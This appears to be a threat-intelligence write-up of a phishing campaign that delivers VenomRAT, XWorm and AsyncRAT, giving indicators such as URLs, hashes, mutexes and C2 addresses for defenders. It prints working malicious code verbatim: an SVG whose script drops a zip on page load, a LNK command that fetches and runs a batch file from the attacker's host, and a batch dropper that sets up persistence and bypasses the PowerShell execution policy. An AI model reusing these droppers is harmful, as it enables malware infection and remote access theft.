THREAT IDENTIFICATION: RAT HAT TRICK - VENOMRAT, XWORM & ASYNCRAT

SENDERS OBSERVED
"Mcourtney"<mcourtney@summithomebuilders.com>

SUBJECTS OBSERVED
Payment Confirmation

URL FROM EMAIL - REDIRECTOR
https://www.sendspace.com/pro/dl/bovzh2

SVG FILE DOWNLOAD URL
https://fs03n1.sendspace.com/dlpro/2e76322c719c1050ec621f948bad7d29/6622a02c/bovzh2/INVOICE-BVSA067HDNSBA.svg

SVG FILE HASH
INVOICE-BVSA067HDNSBA.svg
c17bd6c58592d3b13f76acb6970c80e1
SHA1: 051d65f29593c51312cc817218b48bead50652db

SVG CONTENTS
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" width="100" height="100">
    <script type="application/ecmascript"><![CDATA[
        document.addEventListener("DOMContentLoaded", function() {
            function base64ToArrayBuffer(base64) {
                var binary_string = window.atob(base64);
                var len = binary_string.length;
                var bytes = new Uint8Array(len);
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }
var file = 'UEsDBBQAAAAIABc5kFijrSO/hAAAAJUAAAAYAAAASU5WT0lDRS1UQlNBQ09QTVNLQVMudXJsi/bMK0ktykstCc7ILypJLi2J5eUKDfKxTcvMSbXS1y8uLUrPTE7M0U1LLMrNzEvXTU7US87PdbC0MLDUT8/PT89J1ff0C/P3dHbl5fJ08cksLrHl5fLIL/FOrbQ14OWKrjYwMDAyNHE00AUyoIQzjAUBJma1QEsDivILjG0NLXUsebkAUEsBAhQAFAAAAAgAFzmQWKOtI7+EAAAAlQAAABgAAAAAAAAAAQAgAAAAAAAAAElOVk9JQ0UtVEJTQUNPUE1TS0FTLnVybFBLBQYAAAAAAQABAEYAAAC6AAAAAAA=';
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'INVOICE-TBSACOPMSKAS.zip';
var a = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
document.documentElement.appendChild(a);
a.setAttribute('style', 'display: none');
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
});
]]></script>
</svg>

ZIP FILE HASH
INVOICE-TBSACOPMSKAS.zip
b99e578155a742b900cf0d7890fb8850
SHA1: c49d5cb9b1cb718b305b5cdfcd1436a65a07221a

URL FILE HASH
INVOICE-TBSACOPMSKAS.url
a24d9a27e90f312716c1b043563acbe2
SHA1: 469084d448acef98df310716aea90a8cbd7524c6

URL FILE TARGET
file://surgical-farming-ca.com@9809/google/INVOICE

NEXT STAGE URL
http://surgical-farming-ca.com:9809/google/INVOICE

LNK FILE HASH
INVOICE-RVBSAHOP.lnk
e674a9b96062b0b7a682d8876dbf9a07
SHA1: e8aeca0c97929a133f154a2a8e328b8b20a03f96

LNK FILE DETAILS
Target:
C:\Windows\System32\cmd.exe /c copy "\\surgical-farming-ca.com@9809/google\file.bat" "%USERPROFILE%\Music\file.bat" && "%USERPROFILE%\Music\file.bat"

Start in:
\\surgical-farming-ca.com:9809/google

BATCH FILE HASH
file.bat
71e20fffda810d606ddcfe5213392a13
SHA1: b15f2e8badedd7c8b850fb30933d4b34c401f02b

BATCH FILE CONTENTS
copy /Y "%source%\windows.vbs" "%destination%"

echo Running windows...
"%destination%\windows.vbs"

echo Copying file from %source% to %destination%...
copy /Y "%source%\file.vbs" "%destination%"

echo Running file....
"%destination%\file.vbs"

REM Copy kam.cmd, xff.cmd, zap.cmd, las.cmd, and version.bat to the destination folder
copy /Y "%source%\kam.cmd" "%destination%"
copy /Y "%source%\las.cmd" "%destination%"
copy /Y "%source%\xff.cmd" "%destination%"
copy /Y "%source%\zap.cmd" "%destination%"
copy /Y "%source%\version.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

REM Run kam.cmd and las.cmd and zap.cmd and xff.cmd
for %%f in ("%destination%\kam.cmd" "%destination%\las.cmd") do (
    echo Running %%~nxf...
    start /MIN cmd /c "%%f"
)

taskkill /f /im explorer.exe
timeout 2 /nobreak > nul
start explorer.exe
echo Windows Explorer restarted.

REM Define PowerShell scripts to copy and execute
set "powershell_scripts=xy.ps1 pw.ps1"

REM Copy and execute each PowerShell script
for %%s in (%powershell_scripts%) do (
    echo Copying %%s from %source% to %destination%...
    copy /Y "%source%\%%s" "%destination%"
    IF NOT EXIST "%destination%\%%s" (
        echo Failed to copy %%s. Exiting script.
        exit /b 1
    ) ELSE (
        echo %%s copied successfully.
    )
    echo Running %%s with Bypass policy...
    powershell -ExecutionPolicy Bypass -File "%destination%\%%s"
    IF NOT "%ERRORLEVEL%"=="0" (
        echo %%s failed to execute. Exiting script.
        exit /b 1
    ) ELSE (
        echo %%s executed successfully.
    )
)

echo Closing the script after executing PowerShell scripts.
exit /b 0

ADDTIONAL TRAFFIC OBSERVED
uploaddeimagens.com.br

https://paste.ee/d/c0ETn
https://paste.ee/d/0OQQ1
https://paste.ee/d/3ymOc
(These are script files)

https://kisanbethak.com/A/update.txt
https://kisanbethak.com/A/windows.txt
https://kisanbethak.com/A/upload.txt
https://kisanbethak.com/A/file.txt
(These are all reversed base64-encoded executables)

VBS FILE HASHES
windows.vbs
8f09a2af27cea1d6c4f84ce966228b0a
SHA1: 6cd8b178726bdb78fcbbf3060457ece2a6d2391b

file.vbs
3a6c73a700f558d5f2be2e8d7085f393
SHA1: 6062c1499965c6ae0cebb8e0a724dae99f4a6fbb

CMD FILE HASHES
kam.cmd
26ced4cf2f527df749f641dfcffeb29e
SHA1: 6232fc76d01cccb9cd006367bafd0f7f7f289b8f

las.cmd
8a99bc220ef29053ab1626c7b379e3b2
SHA1: 6b4a1b45336cb11db9abf23bdfa4ac7898e0859b

xff.cmd
f7cdd9170e5079302bda3d280be8c1ea
SHA1: 2677785b7372342dd2b1aa0d8ad3964b1e3cb0a8

zap.cmd
daca38a15826b3b31671cb25ed448c63
SHA1: 727f22492de66b56b478c1f56a999ab3b52de408

NEXT BATCH FILE HASH
version.bat
9ae07d6712738911e152d68f131ff92d
SHA1: dad1b3e80fcf87a39e14577eb8421cf5baccf9f8

POWERSHELL SCRIPT FILE HASHES
xy.ps1
c003b6342b7828dcb9d436a403899d68
25d2b57463626a791442321017592d46d93c2a6c

pw.ps1
6d8726271f6e0a9dfe8b0eb8c81a8ddb
SHA1: 62cf6c6d0eded4026e5bfff4d23315470fc61c7c

POWERSHELL OBFUSCATOR
https://github.com/DARKNOSY/Rush-PowerShell-Obfuscator, made by DARKN0$Y

REVERSED BASE64 ENCODED FILE HASHES DECODED AND SAVED
kisanbethak_file.exe (XWorm v5.6)
8f0ab519a581fb000c2954a1ba43ab88
SHA1: f201faa6831aa17e13a45b22db1feeec23847635

kisanbethak_update.exe (VenomRAT)
e7056286857ffbe22a04a5eeb986d2c5
SHA1: b9dbf76bd53684299460518b8eab51809a8f8059

kisanbethak_upload.exe (XWorm v3.1)
d80a57c22c976dd67cb96f64e009e923
SHA1: ceb8be5527547cfeb3f20b273017f05d81bd0624

kisanbethak_windows.exe (AsyncRAT)
65dd0eb804ba60f6ca1c3e66050422e8
SHA1: 15122bce467af9240631fa820a9c9c96258c9a87

POSSIBLE C2 ADDRESSES
http://surgical-farming-ca.com:9809/google
http://surgical-farming-ca.com:9809/google/INVOICE


MUTEXES FOR THE 3 AddInProcess32.exe PROCESSES
Mutant, \Sessions\1\BaseNamedObjects\Venom_RAT_HVNC_Mutex_Venom RAT_HVNC, 0x3ac
Mutant, \Sessions\1\BaseNamedObjects\QEL4wgqwsRH2WthB, 0xd8
Mutant, \Sessions\1\BaseNamedObjects\AsyncMutex_6SI8OkPnk, 0x39c

VENOMRAT STRINGS IN MEMORY
Venomss.exe
VenomByVenom
Venom RAT + HVNC
VenomRAT Server1
Venom_RAT_HVNC_Mutex_Venom RAT_HVNC
C=CN, L=SH, O=DcRat By qwqdanchun, OU=qwqdanchun, CN=VenomRAT Server
Venom Clients

XWORM STRINGS IN MEMORY
XWorm V5.6
PING!<Xwormmm>AddInProcess32.exe (5276) Properties<Xwormmm>0
pong<Xwormmm>6
pong<Xwormmm>7
PING!<Xwormmm>AddInProcess32.exe (5276) Properties<Xwormmm>8
PING!<Xwormmm>XWorm<Xwormmm>0

ASYNCRAT STRINGS IN MEMORY
AsyncClient.exe
AsyncCallback
IAsyncResult
AsyncClient
AsyncRAT Server0 
AsyncMutex_6SI8OkPnk
CN=AsyncRAT Server


